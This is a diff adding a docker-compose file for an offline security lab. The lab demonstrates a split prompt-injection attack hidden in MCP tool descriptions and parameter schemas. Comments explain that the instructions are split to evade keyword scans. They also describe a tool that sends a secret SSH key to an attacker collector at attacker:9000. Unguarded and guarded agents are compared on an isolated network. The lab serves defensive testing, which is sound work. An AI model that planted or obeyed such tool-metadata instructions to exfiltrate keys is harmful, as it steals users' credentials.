@@ -1,0 +1,142 @@
+# One offline lab network. The attack path (mcp-server, agents, attacker,
+# runner) sits on an `internal` network with no route to the internet —
+# nothing can phone home to a real destination. Only `ollama` is also
+# attached to `egress`, and only so it can pull the model once. No service
+# publishes a port to the host.
+services:
+  # Local model server. Offline after the one-time pull; no API keys.
+  ollama:
+    image: ollama/ollama:0.33.1
+    networks: [lab_net, egress]
+    volumes:
+      - ollama_models:/root/.ollama
+    healthcheck:
+      test: ["CMD", "ollama", "list"]
+      interval: 3s
+      timeout: 5s
+      retries: 40
+
+  # One-shot: pull the pinned model, then exit 0. Everything else waits on it.
+  model-init:
+    image: ollama/ollama:0.33.1
+    depends_on:
+      ollama:
+        condition: service_healthy
+    networks: [lab_net]
+    environment:
+      OLLAMA_HOST: http://ollama:11434
+    entrypoint: ["ollama", "pull", "qwen2.5:3b"]
+    restart: "no"
+
+  # The MCP server, with its exfil instructions split across tool
+  # descriptions and parameter schemas so no single field trips a keyword
+  # scan. Its submit_telemetry tool posts whatever it is given to attacker:9000.
+  mcp-server:
+    build: ./mcp-server
+    environment:
+      PORT: "8080"
+      ATTACKER_URL: http://attacker:9000/collect
+      SECRET_PATH: /secret/id_rsa
+    networks: [lab_net]
+    healthcheck:
+      test:
+        - CMD
+        - node
+        - -e
+        - "fetch('http://localhost:8080/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"
+      interval: 3s
+      timeout: 5s
+      retries: 40
+
+  # The agent, guardrail off: reassembles and follows the split instruction
+  # wherever it appears in the MCP tool metadata.
+  agent-unguarded:
+    build: ./agent
+    environment:
+      GUARD: "off"
+      PORT: "3000"
+      OLLAMA_BASE_URL: http://ollama:11434
+      OLLAMA_MODEL: qwen2.5:3b
+      MCP_SERVER_URL: http://mcp-server:8080/mcp
+      SECRET_DIR: /secret
+    depends_on:
+      model-init:
+        condition: service_completed_successfully
+      mcp-server:
+        condition: service_healthy
+    networks: [lab_net]
+    healthcheck:
+      test:
+        - CMD
+        - node
+        - -e
+        - "fetch('http://localhost:3000/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"
+      interval: 3s
+      timeout: 5s
+      retries: 40
+
+  # The same agent, guardrail on: reassembles tool metadata before deciding
+  # what to trust, so the split instruction is caught before it is followed.
+  agent-guarded:
+    build: ./agent
+    environment:
+      GUARD: "on"
+      PORT: "3000"
+      OLLAMA_BASE_URL: http://ollama:11434
+      OLLAMA_MODEL: qwen2.5:3b
+      MCP_SERVER_URL: http://mcp-server:8080/mcp
+      SECRET_DIR: /secret
+    depends_on:
+      model-init:
+        condition: service_completed_successfully
+      mcp-server:
+        condition: service_healthy
+    networks: [lab_net]
+    healthcheck:
+      test:
+        - CMD
+        - node
+        - -e
+        - "fetch('http://localhost:3000/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))"
+      interval: 3s
+      timeout: 5s
+      retries: 40
+
+  # The attacker's sink: HTTP exfil collector on 9000. Reachable only on
+  # lab_net, no published ports. Writes evidence.
+  attacker:
+    build: ./attacker
+    # Evidence is bind-mounted to ./tmp/evidence on your host so you can
+    # watch the attack land in real time: attacker_http.log.
+    volumes:
+      - ./tmp/evidence:/evidence
+    networks: [lab_net]
+
+  # Runs the attack against both agents and asserts on the evidence. Started
+  # on demand (`docker compose run --rm runner` or `make e2e`), not by
+  # `docker compose up`.
+  runner:
+    build: ./runner
+    profiles: [runners]
+    environment:
+      AGENT_UNGUARDED_URL: http://agent-unguarded:3000
+      AGENT_GUARDED_URL: http://agent-guarded:3000
+      EVIDENCE_DIR: /evidence
+    volumes:
+      - ./tmp/evidence:/evidence
+    depends_on:
+      agent-unguarded:
+        condition: service_healthy
+      agent-guarded:
+        condition: service_healthy
+    networks: [lab_net]
+
+networks:
+  lab_net:
+    internal: true
+  egress: {}
+
+# The model cache stays a named volume (a large, opaque blob store, not
+# something you read); the attack evidence is a host bind mount (see `attacker`).
+volumes:
+  ollama_models: {}
